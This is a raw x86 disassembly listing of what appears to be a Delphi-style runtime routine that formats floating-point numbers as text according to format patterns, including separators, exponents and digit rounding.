  405db1:	b3 00                	mov    $0x0,%bl
  405db3:	ff 14 9d c8 5d 40 00 	call   *0x405dc8(,%ebx,4)
  405dba:	8b c7                	mov    %edi,%eax
  405dbc:	2b 45 fc             	sub    -0x4(%ebp),%eax
  405dbf:	5b                   	pop    %ebx
  405dc0:	5e                   	pop    %esi
  405dc1:	5f                   	pop    %edi
  405dc2:	8b e5                	mov    %ebp,%esp
  405dc4:	5d                   	pop    %ebp
  405dc5:	c2 0c 00             	ret    $0xc
  405dc8:	ef                   	out    %eax,(%dx)
  405dc9:	5d                   	pop    %ebp
  405dca:	40                   	inc    %eax
  405dcb:	00 51 5e             	add    %dl,0x5e(%ecx)
  405dce:	40                   	inc    %eax
  405dcf:	00 c4                	add    %al,%ah
  405dd1:	5e                   	pop    %esi
  405dd2:	40                   	inc    %eax
  405dd3:	00 c4                	add    %al,%ah
  405dd5:	5e                   	pop    %esi
  405dd6:	40                   	inc    %eax
  405dd7:	00 2a                	add    %ch,(%edx)
  405dd9:	5f                   	pop    %edi
  405dda:	40                   	inc    %eax
  405ddb:	00 ac 0a c0 75 03 b0 	add    %ch,-0x4ffc8a40(%edx,%ecx,1)
  405de2:	30 4e c3             	xor    %cl,-0x3d(%esi)
  405de5:	80 7d e6 00          	cmpb   $0x0,-0x1a(%ebp)
  405de9:	74 03                	je     0x405dee
  405deb:	b0 2d                	mov    $0x2d,%al
  405ded:	aa                   	stos   %al,%es:(%edi)
  405dee:	c3                   	ret
  405def:	e8 f1 ff ff ff       	call   0x405de5
  405df4:	0f bf 4d e4          	movswl -0x1c(%ebp),%ecx
  405df8:	33 d2                	xor    %edx,%edx
  405dfa:	3b 4d 0c             	cmp    0xc(%ebp),%ecx
  405dfd:	7f 1f                	jg     0x405e1e
  405dff:	83 f9 fd             	cmp    $0xfffffffd,%ecx
  405e02:	7c 1a                	jl     0x405e1e
  405e04:	0b c9                	or     %ecx,%ecx
  405e06:	7f 1c                	jg     0x405e24
  405e08:	b0 30                	mov    $0x30,%al
  405e0a:	aa                   	stos   %al,%es:(%edi)
  405e0b:	80 3e 00             	cmpb   $0x0,(%esi)
  405e0e:	74 40                	je     0x405e50
  405e10:	a0 9b c4 40 00       	mov    0x40c49b,%al
  405e15:	aa                   	stos   %al,%es:(%edi)
  405e16:	f7 d9                	neg    %ecx
  405e18:	b0 30                	mov    $0x30,%al
  405e1a:	f3 aa                	rep stos %al,%es:(%edi)
  405e1c:	eb 1c                	jmp    0x405e3a
  405e1e:	b9 01 00 00 00       	mov    $0x1,%ecx
  405e23:	42                   	inc    %edx
  405e24:	ac                   	lods   %ds:(%esi),%al
  405e25:	0a c0                	or     %al,%al
  405e27:	74 19                	je     0x405e42
  405e29:	aa                   	stos   %al,%es:(%edi)
  405e2a:	e2 f8                	loop   0x405e24
  405e2c:	ac                   	lods   %ds:(%esi),%al
  405e2d:	0a c0                	or     %al,%al
  405e2f:	74 15                	je     0x405e46
  405e31:	8a e0                	mov    %al,%ah
  405e33:	a0 9b c4 40 00       	mov    0x40c49b,%al
  405e38:	66 ab                	stos   %ax,%es:(%edi)
  405e3a:	ac                   	lods   %ds:(%esi),%al
  405e3b:	0a c0                	or     %al,%al
  405e3d:	74 07                	je     0x405e46
  405e3f:	aa                   	stos   %al,%es:(%edi)
  405e40:	eb f8                	jmp    0x405e3a
  405e42:	b0 30                	mov    $0x30,%al
  405e44:	f3 aa                	rep stos %al,%es:(%edi)
  405e46:	0b d2                	or     %edx,%edx
  405e48:	74 06                	je     0x405e50
  405e4a:	33 c0                	xor    %eax,%eax
  405e4c:	33 c9                	xor    %ecx,%ecx
  405e4e:	eb 2b                	jmp    0x405e7b
  405e50:	c3                   	ret
  405e51:	e8 8f ff ff ff       	call   0x405de5
  405e56:	e8 81 ff ff ff       	call   0x405ddc
  405e5b:	8a 25 9b c4 40 00    	mov    0x40c49b,%ah
  405e61:	66 ab                	stos   %ax,%es:(%edi)
  405e63:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  405e66:	49                   	dec    %ecx
  405e67:	e8 70 ff ff ff       	call   0x405ddc
  405e6c:	aa                   	stos   %al,%es:(%edi)
  405e6d:	e2 f8                	loop   0x405e67
  405e6f:	b4 2b                	mov    $0x2b,%ah
  405e71:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405e74:	83 f9 04             	cmp    $0x4,%ecx
  405e77:	72 02                	jb     0x405e7b
  405e79:	33 c9                	xor    %ecx,%ecx
  405e7b:	b0 45                	mov    $0x45,%al
  405e7d:	8a 5d e7             	mov    -0x19(%ebp),%bl
  405e80:	0f bf 55 e4          	movswl -0x1c(%ebp),%edx
  405e84:	4a                   	dec    %edx
  405e85:	aa                   	stos   %al,%es:(%edi)
  405e86:	0a db                	or     %bl,%bl
  405e88:	75 04                	jne    0x405e8e
  405e8a:	33 d2                	xor    %edx,%edx
  405e8c:	eb 0a                	jmp    0x405e98
  405e8e:	0b d2                	or     %edx,%edx
  405e90:	7d 06                	jge    0x405e98
  405e92:	b0 2d                	mov    $0x2d,%al
  405e94:	f7 da                	neg    %edx
  405e96:	eb 06                	jmp    0x405e9e
  405e98:	0a e4                	or     %ah,%ah
  405e9a:	74 03                	je     0x405e9f
  405e9c:	8a c4                	mov    %ah,%al
  405e9e:	aa                   	stos   %al,%es:(%edi)
  405e9f:	92                   	xchg   %eax,%edx
  405ea0:	50                   	push   %eax
  405ea1:	8b dc                	mov    %esp,%ebx
  405ea3:	33 d2                	xor    %edx,%edx
  405ea5:	f7 35 0c 5d 40 00    	divl   0x405d0c
  405eab:	80 c2 30             	add    $0x30,%dl
  405eae:	88 13                	mov    %dl,(%ebx)
  405eb0:	43                   	inc    %ebx
  405eb1:	49                   	dec    %ecx
  405eb2:	0b c0                	or     %eax,%eax
  405eb4:	75 ed                	jne    0x405ea3
  405eb6:	0b c9                	or     %ecx,%ecx
  405eb8:	7f e9                	jg     0x405ea3
  405eba:	4b                   	dec    %ebx
  405ebb:	8a 03                	mov    (%ebx),%al
  405ebd:	aa                   	stos   %al,%es:(%edi)
  405ebe:	3b dc                	cmp    %esp,%ebx
  405ec0:	75 f8                	jne    0x405eba
  405ec2:	58                   	pop    %eax
  405ec3:	c3                   	ret
  405ec4:	e8 1c ff ff ff       	call   0x405de5
  405ec9:	8b 55 08             	mov    0x8(%ebp),%edx
  405ecc:	83 fa 12             	cmp    $0x12,%edx
  405ecf:	72 05                	jb     0x405ed6
  405ed1:	ba 12 00 00 00       	mov    $0x12,%edx
  405ed6:	0f bf 4d e4          	movswl -0x1c(%ebp),%ecx
  405eda:	0b c9                	or     %ecx,%ecx
  405edc:	7f 05                	jg     0x405ee3
  405ede:	b0 30                	mov    $0x30,%al
  405ee0:	aa                   	stos   %al,%es:(%edi)
  405ee1:	eb 28                	jmp    0x405f0b
  405ee3:	33 db                	xor    %ebx,%ebx
  405ee5:	80 7d 10 02          	cmpb   $0x2,0x10(%ebp)
  405ee9:	74 0a                	je     0x405ef5
  405eeb:	8b c1                	mov    %ecx,%eax
  405eed:	48                   	dec    %eax
  405eee:	b3 03                	mov    $0x3,%bl
  405ef0:	f6 f3                	div    %bl
  405ef2:	8a dc                	mov    %ah,%bl
  405ef4:	43                   	inc    %ebx
  405ef5:	e8 e2 fe ff ff       	call   0x405ddc
  405efa:	aa                   	stos   %al,%es:(%edi)
  405efb:	49                   	dec    %ecx
  405efc:	74 0d                	je     0x405f0b
  405efe:	4b                   	dec    %ebx
  405eff:	75 f4                	jne    0x405ef5
  405f01:	a0 9a c4 40 00       	mov    0x40c49a,%al
  405f06:	aa                   	stos   %al,%es:(%edi)
  405f07:	b3 03                	mov    $0x3,%bl
  405f09:	eb ea                	jmp    0x405ef5
  405f0b:	0b d2                	or     %edx,%edx
  405f0d:	74 1a                	je     0x405f29
  405f0f:	a0 9b c4 40 00       	mov    0x40c49b,%al
  405f14:	aa                   	stos   %al,%es:(%edi)
  405f15:	e3 09                	jecxz  0x405f20
  405f17:	b0 30                	mov    $0x30,%al
  405f19:	aa                   	stos   %al,%es:(%edi)
  405f1a:	4a                   	dec    %edx
  405f1b:	74 0c                	je     0x405f29
  405f1d:	41                   	inc    %ecx
  405f1e:	75 f9                	jne    0x405f19
  405f20:	e8 b7 fe ff ff       	call   0x405ddc
  405f25:	aa                   	stos   %al,%es:(%edi)
  405f26:	4a                   	dec    %edx
  405f27:	75 f7                	jne    0x405f20
  405f29:	c3                   	ret
  405f2a:	33 db                	xor    %ebx,%ebx
  405f2c:	8a 1d 98 c4 40 00    	mov    0x40c498,%bl
  405f32:	b9 03 00 00 00       	mov    $0x3,%ecx
  405f37:	80 7d e6 00          	cmpb   $0x0,-0x1a(%ebp)
  405f3b:	74 0b                	je     0x405f48
  405f3d:	8a 1d 99 c4 40 00    	mov    0x40c499,%bl
  405f43:	b9 0f 04 00 00       	mov    $0x40f,%ecx
  405f48:	3a d9                	cmp    %cl,%bl
  405f4a:	76 02                	jbe    0x405f4e
  405f4c:	8a d9                	mov    %cl,%bl
  405f4e:	02 dd                	add    %ch,%bl
  405f50:	8d 9c 9b 93 5f 40 00 	lea    0x405f93(%ebx,%ebx,4),%ebx
  405f57:	b9 05 00 00 00       	mov    $0x5,%ecx
  405f5c:	8a 03                	mov    (%ebx),%al
  405f5e:	3c 40                	cmp    $0x40,%al
  405f60:	74 1e                	je     0x405f80
  405f62:	51                   	push   %ecx
  405f63:	53                   	push   %ebx
  405f64:	3c 24                	cmp    $0x24,%al
  405f66:	74 07                	je     0x405f6f
  405f68:	3c 2a                	cmp    $0x2a,%al
  405f6a:	74 0a                	je     0x405f76
  405f6c:	aa                   	stos   %al,%es:(%edi)
  405f6d:	eb 0c                	jmp    0x405f7b
  405f6f:	e8 0d 00 00 00       	call   0x405f81
  405f74:	eb 05                	jmp    0x405f7b
  405f76:	e8 4e ff ff ff       	call   0x405ec9
  405f7b:	5b                   	pop    %ebx
  405f7c:	59                   	pop    %ecx
  405f7d:	43                   	inc    %ebx
  405f7e:	e2 dc                	loop   0x405f5c
  405f80:	c3                   	ret
  405f81:	56                   	push   %esi
  405f82:	8b 35 94 c4 40 00    	mov    0x40c494,%esi
  405f88:	85 f6                	test   %esi,%esi
  405f8a:	74 05                	je     0x405f91
  405f8c:	8b 4e fc             	mov    -0x4(%esi),%ecx
  405f8f:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  405f91:	5e                   	pop    %esi
  405f92:	c3                   	ret
  405f93:	24 2a                	and    $0x2a,%al
  405f95:	40                   	inc    %eax
  405f96:	40                   	inc    %eax
  405f97:	40                   	inc    %eax
  405f98:	2a 24 40             	sub    (%eax,%eax,2),%ah
  405f9b:	40                   	inc    %eax
  405f9c:	40                   	inc    %eax
  405f9d:	24 20                	and    $0x20,%al
  405f9f:	2a 40 40             	sub    0x40(%eax),%al
  405fa2:	2a 20                	sub    (%eax),%ah
  405fa4:	24 40                	and    $0x40,%al
  405fa6:	40                   	inc    %eax
  405fa7:	28 24 2a             	sub    %ah,(%edx,%ebp,1)
  405faa:	29 40 2d             	sub    %eax,0x2d(%eax)
  405fad:	24 2a                	and    $0x2a,%al
  405faf:	40                   	inc    %eax
  405fb0:	40                   	inc    %eax
  405fb1:	24 2d                	and    $0x2d,%al
  405fb3:	2a 40 40             	sub    0x40(%eax),%al
  405fb6:	24 2a                	and    $0x2a,%al
  405fb8:	2d 40 40 28 2a       	sub    $0x2a284040,%eax
  405fbd:	24 29                	and    $0x29,%al
  405fbf:	40                   	inc    %eax
  405fc0:	2d 2a 24 40 40       	sub    $0x4040242a,%eax
  405fc5:	2a 2d 24 40 40 2a    	sub    0x2a404024,%ch
  405fcb:	24 2d                	and    $0x2d,%al
  405fcd:	40                   	inc    %eax
  405fce:	40                   	inc    %eax
  405fcf:	2d 2a 20 24 40       	sub    $0x4024202a,%eax
  405fd4:	2d 24 20 2a 40       	sub    $0x402a2024,%eax
  405fd9:	2a 20                	sub    (%eax),%ah
  405fdb:	24 2d                	and    $0x2d,%al
  405fdd:	40                   	inc    %eax
  405fde:	24 20                	and    $0x20,%al
  405fe0:	2a 2d 40 24 20 2d    	sub    0x2d202440,%ch
  405fe6:	2a 40 2a             	sub    0x2a(%eax),%al
  405fe9:	2d 20 24 40 28       	sub    $0x28402420,%eax
  405fee:	24 20                	and    $0x20,%al
  405ff0:	2a 29                	sub    (%ecx),%ch
  405ff2:	28 2a                	sub    %ch,(%edx)
  405ff4:	20 24 29             	and    %ah,(%ecx,%ebp,1)
  405ff7:	55                   	push   %ebp
  405ff8:	8b ec                	mov    %esp,%ebp
  405ffa:	83 ec 40             	sub    $0x40,%esp
  405ffd:	57                   	push   %edi
  405ffe:	56                   	push   %esi
  405fff:	53                   	push   %ebx
  406000:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406003:	8b fa                	mov    %edx,%edi
  406005:	8b d9                	mov    %ecx,%ebx
  406007:	b9 02 00 00 00       	mov    $0x2,%ecx
  40600c:	80 fb 00             	cmp    $0x0,%bl
  40600f:	74 0f                	je     0x406020
  406011:	8b 07                	mov    (%edi),%eax
  406013:	0b 47 04             	or     0x4(%edi),%eax
  406016:	74 1a                	je     0x406032
  406018:	8b 4f 04             	mov    0x4(%edi),%ecx
  40601b:	c1 e9 1f             	shr    $0x1f,%ecx
  40601e:	eb 12                	jmp    0x406032
  406020:	0f b7 47 08          	movzwl 0x8(%edi),%eax
  406024:	0b 07                	or     (%edi),%eax
  406026:	0b 47 04             	or     0x4(%edi),%eax
  406029:	74 07                	je     0x406032
  40602b:	0f b7 4f 08          	movzwl 0x8(%edi),%ecx
  40602f:	c1 e9 0f             	shr    $0xf,%ecx
  406032:	e8 8c 00 00 00       	call   0x4060c3
  406037:	74 4c                	je     0x406085
  406039:	e8 c0 00 00 00       	call   0x4060fe
  40603e:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406041:	ba 0f 27 00 00       	mov    $0x270f,%edx
  406046:	80 7d f4 00          	cmpb   $0x0,-0xc(%ebp)
  40604a:	75 0a                	jne    0x406056
  40604c:	2b 45 e8             	sub    -0x18(%ebp),%eax
  40604f:	8b d0                	mov    %eax,%edx
  406051:	b8 12 00 00 00       	mov    $0x12,%eax
  406056:	50                   	push   %eax
  406057:	52                   	push   %edx
  406058:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40605b:	8b d7                	mov    %edi,%edx
  40605d:	8b cb                	mov    %ebx,%ecx
  40605f:	e8 66 02 00 00       	call   0x4062ca
  406064:	66 8b 45 c0          	mov    -0x40(%ebp),%ax
  406068:	66 3d 00 80          	cmp    $0x8000,%ax
  40606c:	74 17                	je     0x406085
  40606e:	66 3d ff 7f          	cmp    $0x7fff,%ax
  406072:	74 11                	je     0x406085
  406074:	80 fb 00             	cmp    $0x0,%bl
  406077:	75 20                	jne    0x406099
  406079:	66 3d 12 00          	cmp    $0x12,%ax
  40607d:	7e 1a                	jle    0x406099
  40607f:	80 7d f4 00          	cmpb   $0x0,-0xc(%ebp)
  406083:	75 14                	jne    0x406099
  406085:	6a 00                	push   $0x0
  406087:	6a 0f                	push   $0xf
  406089:	6a 00                	push   $0x0
  40608b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40608e:	8b d7                	mov    %edi,%edx
  406090:	8b cb                	mov    %ebx,%ecx
  406092:	e8 97 fc ff ff       	call   0x405d2e
  406097:	eb 21                	jmp    0x4060ba
  406099:	80 7d c3 00          	cmpb   $0x0,-0x3d(%ebp)
  40609d:	75 16                	jne    0x4060b5
  40609f:	b9 02 00 00 00       	mov    $0x2,%ecx
  4060a4:	e8 1a 00 00 00       	call   0x4060c3
  4060a9:	74 da                	je     0x406085
  4060ab:	3b 75 f0             	cmp    -0x10(%ebp),%esi
  4060ae:	74 05                	je     0x4060b5
  4060b0:	e8 49 00 00 00       	call   0x4060fe
  4060b5:	e8 ef 00 00 00       	call   0x4061a9
  4060ba:	5b                   	pop    %ebx
  4060bb:	5e                   	pop    %esi
  4060bc:	5f                   	pop    %edi
  4060bd:	8b e5                	mov    %ebp,%esp
  4060bf:	5d                   	pop    %ebp
  4060c0:	c2 04 00             	ret    $0x4
  4060c3:	8b 75 08             	mov    0x8(%ebp),%esi
  4060c6:	e3 1d                	jecxz  0x4060e5
  4060c8:	ac                   	lods   %ds:(%esi),%al
  4060c9:	3c 27                	cmp    $0x27,%al
  4060cb:	74 24                	je     0x4060f1
  4060cd:	3c 22                	cmp    $0x22,%al
  4060cf:	74 20                	je     0x4060f1
  4060d1:	0a c0                	or     %al,%al
  4060d3:	74 10                	je     0x4060e5
  4060d5:	3c 3b                	cmp    $0x3b,%al
  4060d7:	75 ef                	jne    0x4060c8
  4060d9:	e2 ed                	loop   0x4060c8
  4060db:	8a 06                	mov    (%esi),%al
  4060dd:	0a c0                	or     %al,%al
  4060df:	74 04                	je     0x4060e5
  4060e1:	3c 3b                	cmp    $0x3b,%al
  4060e3:	75 0b                	jne    0x4060f0
  4060e5:	8b 75 08             	mov    0x8(%ebp),%esi
  4060e8:	8a 06                	mov    (%esi),%al
  4060ea:	0a c0                	or     %al,%al
  4060ec:	74 02                	je     0x4060f0
  4060ee:	3c 3b                	cmp    $0x3b,%al
  4060f0:	c3                   	ret
  4060f1:	8a e0                	mov    %al,%ah
  4060f3:	ac                   	lods   %ds:(%esi),%al
  4060f4:	3a c4                	cmp    %ah,%al
  4060f6:	74 d0                	je     0x4060c8
  4060f8:	0a c0                	or     %al,%al
  4060fa:	75 f7                	jne    0x4060f3
  4060fc:	eb e7                	jmp    0x4060e5
  4060fe:	53                   	push   %ebx
  4060ff:	89 75 f0             	mov    %esi,-0x10(%ebp)
  406102:	bb ff 7f 00 00       	mov    $0x7fff,%ebx
  406107:	33 c9                	xor    %ecx,%ecx
  406109:	33 d2                	xor    %edx,%edx
  40610b:	c7 45 e8 ff ff ff ff 	movl   $0xffffffff,-0x18(%ebp)
  406112:	88 55 f8             	mov    %dl,-0x8(%ebp)
  406115:	88 55 f4             	mov    %dl,-0xc(%ebp)
  406118:	ac                   	lods   %ds:(%esi),%al
  406119:	3c 23                	cmp    $0x23,%al
  40611b:	74 26                	je     0x406143
  40611d:	3c 30                	cmp    $0x30,%al
  40611f:	74 25                	je     0x406146
  406121:	3c 2e                	cmp    $0x2e,%al
  406123:	74 2c                	je     0x406151
  406125:	3c 2c                	cmp    $0x2c,%al
  406127:	74 33                	je     0x40615c
  406129:	3c 27                	cmp    $0x27,%al
  40612b:	74 35                	je     0x406162
  40612d:	3c 22                	cmp    $0x22,%al
  40612f:	74 31                	je     0x406162
  406131:	3c 45                	cmp    $0x45,%al
  406133:	74 3a                	je     0x40616f
  406135:	3c 65                	cmp    $0x65,%al
  406137:	74 36                	je     0x40616f
  406139:	3c 3b                	cmp    $0x3b,%al
  40613b:	74 46                	je     0x406183
  40613d:	0a c0                	or     %al,%al
  40613f:	75 d7                	jne    0x406118
  406141:	eb 40                	jmp    0x406183
  406143:	42                   	inc    %edx
  406144:	eb d2                	jmp    0x406118
  406146:	3b d3                	cmp    %ebx,%edx
  406148:	7d 02                	jge    0x40614c
  40614a:	8b da                	mov    %edx,%ebx
  40614c:	42                   	inc    %edx
  40614d:	8b ca                	mov    %edx,%ecx
  40614f:	eb c7                	jmp    0x406118
  406151:	83 7d e8 ff          	cmpl   $0xffffffff,-0x18(%ebp)
  406155:	75 c1                	jne    0x406118
  406157:	89 55 e8             	mov    %edx,-0x18(%ebp)
  40615a:	eb bc                	jmp    0x406118
  40615c:	c6 45 f8 01          	movb   $0x1,-0x8(%ebp)
  406160:	eb b6                	jmp    0x406118
  406162:	8a e0                	mov    %al,%ah
  406164:	ac                   	lods   %ds:(%esi),%al
  406165:	3a c4                	cmp    %ah,%al
  406167:	74 af                	je     0x406118
  406169:	0a c0                	or     %al,%al
  40616b:	75 f7                	jne    0x406164
  40616d:	eb 14                	jmp    0x406183
  40616f:	ac                   	lods   %ds:(%esi),%al
  406170:	3c 2d                	cmp    $0x2d,%al
  406172:	74 04                	je     0x406178
  406174:	3c 2b                	cmp    $0x2b,%al
  406176:	75 a1                	jne    0x406119
  406178:	c6 45 f4 01          	movb   $0x1,-0xc(%ebp)
  40617c:	ac                   	lods   %ds:(%esi),%al
  40617d:	3c 30                	cmp    $0x30,%al
  40617f:	74 fb                	je     0x40617c
  406181:	eb 96                	jmp    0x406119
  406183:	89 55 ec             	mov    %edx,-0x14(%ebp)
  406186:	83 7d e8 ff          	cmpl   $0xffffffff,-0x18(%ebp)
  40618a:	75 03                	jne    0x40618f
  40618c:	89 55 e8             	mov    %edx,-0x18(%ebp)
  40618f:	8b 45 e8             	mov    -0x18(%ebp),%eax
  406192:	2b c1                	sub    %ecx,%eax
  406194:	7e 02                	jle    0x406198
  406196:	33 c0                	xor    %eax,%eax
  406198:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40619b:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40619e:	2b c3                	sub    %ebx,%eax
  4061a0:	7d 02                	jge    0x4061a4
  4061a2:	33 c0                	xor    %eax,%eax
  4061a4:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4061a7:	5b                   	pop    %ebx
  4061a8:	c3                   	ret
  4061a9:	80 7d f4 00          	cmpb   $0x0,-0xc(%ebp)
  4061ad:	74 07                	je     0x4061b6
  4061af:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4061b2:	33 d2                	xor    %edx,%edx
  4061b4:	eb 13                	jmp    0x4061c9
  4061b6:	0f bf 45 c0          	movswl -0x40(%ebp),%eax
  4061ba:	3b 45 e8             	cmp    -0x18(%ebp),%eax
  4061bd:	7f 03                	jg     0x4061c2
  4061bf:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4061c2:	0f bf 55 c0          	movswl -0x40(%ebp),%edx
  4061c6:	2b 55 e8             	sub    -0x18(%ebp),%edx
  4061c9:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4061cc:	89 55 d8             	mov    %edx,-0x28(%ebp)
  4061cf:	8b 75 f0             	mov    -0x10(%ebp),%esi
  4061d2:	8b 7d fc             	mov    -0x4(%ebp),%edi
  4061d5:	8d 5d c3             	lea    -0x3d(%ebp),%ebx
  4061d8:	80 7d c2 00          	cmpb   $0x0,-0x3e(%ebp)
  4061dc:	74 08                	je     0x4061e6
  4061de:	3b 75 08             	cmp    0x8(%ebp),%esi
  4061e1:	75 03                	jne    0x4061e6
  4061e3:	b0 2d                	mov    $0x2d,%al
  4061e5:	aa                   	stos   %al,%es:(%edi)
  4061e6:	ac                   	lods   %ds:(%esi),%al
  4061e7:	3c 23                	cmp    $0x23,%al
  4061e9:	74 27                	je     0x406212
  4061eb:	3c 30                	cmp    $0x30,%al
  4061ed:	74 23                	je     0x406212
  4061ef:	3c 2e                	cmp    $0x2e,%al
  4061f1:	74 f3                	je     0x4061e6
  4061f3:	3c 2c                	cmp    $0x2c,%al
  4061f5:	74 ef                	je     0x4061e6
  4061f7:	3c 27                	cmp    $0x27,%al
  4061f9:	74 1e                	je     0x406219
  4061fb:	3c 22                	cmp    $0x22,%al
  4061fd:	74 1a                	je     0x406219
  4061ff:	3c 45                	cmp    $0x45,%al
  406201:	74 24                	je     0x406227
  406203:	3c 65                	cmp    $0x65,%al
  406205:	74 20                	je     0x406227
  406207:	3c 3b                	cmp    $0x3b,%al
  406209:	74 53                	je     0x40625e
  40620b:	0a c0                	or     %al,%al
  40620d:	74 4f                	je     0x40625e
  40620f:	aa                   	stos   %al,%es:(%edi)
  406210:	eb d4                	jmp    0x4061e6
  406212:	e8 4d 00 00 00       	call   0x406264
  406217:	eb cd                	jmp    0x4061e6
  406219:	8a e0                	mov    %al,%ah
  40621b:	ac                   	lods   %ds:(%esi),%al
  40621c:	3a c4                	cmp    %ah,%al
  40621e:	74 c6                	je     0x4061e6
  406220:	0a c0                	or     %al,%al
  406222:	74 3a                	je     0x40625e
  406224:	aa                   	stos   %al,%es:(%edi)
  406225:	eb f4                	jmp    0x40621b
  406227:	8a 26                	mov    (%esi),%ah
  406229:	80 fc 2b             	cmp    $0x2b,%ah
  40622c:	74 07                	je     0x406235
  40622e:	80 fc 2d             	cmp    $0x2d,%ah
  406231:	75 dc                	jne    0x40620f
  406233:	32 e4                	xor    %ah,%ah
  406235:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
  40623a:	41                   	inc    %ecx
  40623b:	46                   	inc    %esi
  40623c:	80 3e 30             	cmpb   $0x30,(%esi)
  40623f:	74 f9                	je     0x40623a
  406241:	83 f9 04             	cmp    $0x4,%ecx
  406244:	72 05                	jb     0x40624b
  406246:	b9 04 00 00 00       	mov    $0x4,%ecx
  40624b:	53                   	push   %ebx
  40624c:	8a 5d c3             	mov    -0x3d(%ebp),%bl
  40624f:	0f bf 55 c0          	movswl -0x40(%ebp),%edx
  406253:	2b 55 e8             	sub    -0x18(%ebp),%edx
  406256:	e8 2a fc ff ff       	call   0x405e85
  40625b:	5b                   	pop    %ebx
  40625c:	eb 88                	jmp    0x4061e6
  40625e:	8b c7                	mov    %edi,%eax
  406260:	2b 45 fc             	sub    -0x4(%ebp),%eax
  406263:	c3                   	ret
  406264:	83 7d d8 00          	cmpl   $0x0,-0x28(%ebp)
  406268:	74 1b                	je     0x406285
  40626a:	7c 0c                	jl     0x406278
  40626c:	e8 14 00 00 00       	call   0x406285
  406271:	ff 4d d8             	decl   -0x28(%ebp)
  406274:	75 f6                	jne    0x40626c
  406276:	eb 0d                	jmp    0x406285
  406278:	ff 45 d8             	incl   -0x28(%ebp)
  40627b:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40627e:	3b 45 e4             	cmp    -0x1c(%ebp),%eax
  406281:	7e 12                	jle    0x406295
  406283:	eb 41                	jmp    0x4062c6
  406285:	8a 03                	mov    (%ebx),%al
  406287:	43                   	inc    %ebx
  406288:	0a c0                	or     %al,%al
  40628a:	75 0b                	jne    0x406297
  40628c:	4b                   	dec    %ebx
  40628d:	8b 45 dc             	mov    -0x24(%ebp),%eax
  406290:	3b 45 e0             	cmp    -0x20(%ebp),%eax
  406293:	7e 31                	jle    0x4062c6
  406295:	b0 30                	mov    $0x30,%al
  406297:	83 7d dc 00          	cmpl   $0x0,-0x24(%ebp)
  40629b:	75 0b                	jne    0x4062a8
  40629d:	8a e0                	mov    %al,%ah
  40629f:	a0 9b c4 40 00       	mov    0x40c49b,%al
  4062a4:	66 ab                	stos   %ax,%es:(%edi)
  4062a6:	eb 1e                	jmp    0x4062c6
  4062a8:	aa                   	stos   %al,%es:(%edi)
  4062a9:	80 7d f8 00          	cmpb   $0x0,-0x8(%ebp)
  4062ad:	74 17                	je     0x4062c6
  4062af:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4062b2:	83 f8 01             	cmp    $0x1,%eax
  4062b5:	7e 0f                	jle    0x4062c6
  4062b7:	b2 03                	mov    $0x3,%dl
  4062b9:	f6 f2                	div    %dl
  4062bb:	80 fc 01             	cmp    $0x1,%ah
  4062be:	75 06                	jne    0x4062c6
  4062c0:	a0 9a c4 40 00       	mov    0x40c49a,%al
  4062c5:	aa                   	stos   %al,%es:(%edi)
  4062c6:	ff 4d dc             	decl   -0x24(%ebp)
  4062c9:	c3                   	ret
  4062ca:	55                   	push   %ebp
  4062cb:	8b ec                	mov    %esp,%ebp
  4062cd:	83 ec 1a             	sub    $0x1a,%esp
  4062d0:	57                   	push   %edi
  4062d1:	56                   	push   %esi
  4062d2:	53                   	push   %ebx
  4062d3:	8b d8                	mov    %eax,%ebx
  4062d5:	8b f2                	mov    %edx,%esi
  4062d7:	80 f9 00             	cmp    $0x0,%cl
  4062da:	74 07                	je     0x4062e3
  4062dc:	e8 05 01 00 00       	call   0x4063e6
  4062e1:	eb 05                	jmp    0x4062e8
  4062e3:	e8 09 00 00 00       	call   0x4062f1
  4062e8:	5b                   	pop    %ebx
  4062e9:	5e                   	pop    %esi
  4062ea:	5f                   	pop    %edi
  4062eb:	8b e5                	mov    %ebp,%esp
  4062ed:	5d                   	pop    %ebp
  4062ee:	c2 08 00             	ret    $0x8
  4062f1:	66 8b 46 08          	mov    0x8(%esi),%ax
  4062f5:	8b d0                	mov    %eax,%edx
  4062f7:	25 ff 7f 00 00       	and    $0x7fff,%eax
  4062fc:	74 10                	je     0x40630e
  4062fe:	3d ff 7f 00 00       	cmp    $0x7fff,%eax
  406303:	75 14                	jne    0x406319
  406305:	66 81 7e 06 00 80    	cmpw   $0x8000,0x6(%esi)
  40630b:	74 03                	je     0x406310
  40630d:	40                   	inc    %eax
  40630e:	33 d2                	xor    %edx,%edx
  406310:	c6 43 03 00          	movb   $0x0,0x3(%ebx)
  406314:	e9 c2 00 00 00       	jmp    0x4063db
  406319:	db 2e                	fldt   (%esi)
  40631b:	2d ff 3f 00 00       	sub    $0x3fff,%eax
  406320:	69 c0 10 4d 00 00    	imul   $0x4d10,%eax,%eax
  406326:	c1 f8 10             	sar    $0x10,%eax
  406329:	40                   	inc    %eax
  40632a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40632d:	b8 12 00 00 00       	mov    $0x12,%eax
  406332:	2b 45 f8             	sub    -0x8(%ebp),%eax
  406335:	d9 e1                	fabs
  406337:	e8 d8 dc ff ff       	call   0x404014
  40633c:	d9 fc                	frndint
  40633e:	db 2d 1c 5d 40 00    	fldt   0x405d1c
  406344:	d8 d9                	fcomp  %st(1)
  406346:	9b dd 7d fc          	fstsw  -0x4(%ebp)
  40634a:	9b                   	fwait
  40634b:	66 f7 45 fc 00 41    	testw  $0x4100,-0x4(%ebp)
  406351:	74 09                	je     0x40635c
  406353:	da 35 0c 5d 40 00    	fidivl 0x405d0c
  406359:	ff 45 f8             	incl   -0x8(%ebp)
  40635c:	df 75 e6             	fbstp  -0x1a(%ebp)
